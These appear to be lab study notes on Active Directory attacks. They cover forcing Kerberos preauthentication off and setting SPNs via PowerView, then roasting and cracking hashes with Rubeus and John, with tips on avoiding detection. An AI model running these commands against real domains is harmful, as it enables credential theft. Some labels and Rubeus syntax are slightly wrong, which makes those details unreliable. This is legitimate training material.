If a user's `UserAccountControl` settings have "Do not require kerberos preauthentication" it is possible to grab user's crackable `AS-REP` and brute-force it offline.
- For example `kerberos preauth` is disabled.

**With sufficient rights (`GenericWrite` or `genericAll`) on a `user` we can also force disabling `Kerberos preauth`**

>[!important] Which attack we prefer
>If we have (`GenericWrite` or `genericAll`)on a `user` we prefer to perform a kerberos preauth disable and kerberoasting `AS-REP`. 
>It is more silent.


![[Pasted image 20261126102340.png]]



# 1. Disabling Kerberos Preauth

With `student555` we are part of `RPDUsers` group.

>[!note] These commands are powerview commands

## 1.1 Check the permissions of our user
So we can understand which are the permissions of our group:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```


## 1.2. Disable the preauth on a user on which we have permissions.

Then we can disable the `kerberos preauth` using:

```powershell
Set-DomainObject -identity controluser1 -XOR @{useraccountcontrol=4194304} -verbose
```
- `4194304` is the flag `DONT_REQ_PREAUTH`

>[!note] Che fa questo comando?
>`Set-DomainObject` Modifica gli attributi di un oggetto Active Directory.
>`-Identity controluser1` Specifica l'account da modificare.
>`-XOR` Applica un'operazione XOR bit a bit al valore esistente.
>`@{useraccountcontrol=4194304}` Specifica l'attributo e la maschera di bit da modificare
>	`4194304` indica il flag `DONT_REQ_PREAUTH`


## 1.3 Check the users with `DONT_REQ_PREAUTH`

To check the users that have the preauth disabled we can do:

```powershell
Get-DomainUser -PreauthNotrequired -verbose
```


## 1.4. request encrypted AS-REP and then bruteforce it

We can request a  `encrypted AS-REP` using

```powershell
C:\AD\Tools\Rubeus.exe asreproast /user:<username> outfile:C:\AD\Tools\asrephashes.txt
```

>[!warning] Always specify the user
>If you don't specify the user it will do it for all possible target user and it's very  noisy.
>![[Pasted image 20261126104101.png]]




Then using `johntheripper` we can try to bruteforce it:

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt 
```



# 2. Targeted Kerberoasting - SET SPN 

**With sufficient rights (`GenericWrite` or `genericAll`) on a `user` we can also force the change of the attribute `SPN` of the user and set as anything we want.**

Then we ca request a `TGS` without special privileges.
The TGS can then kerberoasted.

## 2.1. Set SPN for a user on which we have permissions.

>[!important] The SPN we set must be unique in the forest.


We can do it using powerview:
```powershell
Set-DomainObject -identity <username> -Set @{serviceprincipalname='dcorp/whateverwewant'}
```

>[!note] with admodule
>```powershell
Set-ADUSer -identity <username> -ServicePrincipalNames @{Add='dcorp/whateverwewant'} ```


## 2.2. request encrypted AS-REP and then bruteforce it

We can request a  `encrypted AS-REP` using

```powershell
C:\AD\Tools\Rubeus.exe kerberoast /user:<username> outfile:C:\AD\Tools\hashes.txt
```

>[!warning] Always specify the user
>If you don't specify the user it will do it for all possible target user and it's very  noisy.
>![[Pasted image 20261126104101.png]]



Then using `johntheripper` we can try to bruteforce it:

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt 
```



>[!important] Wordlists
>you can use also crunch, bopscrk. CeWL to generate custom wordlists.
>
>A good collection can be found at [https://github.com/danielmiessler/SecList]


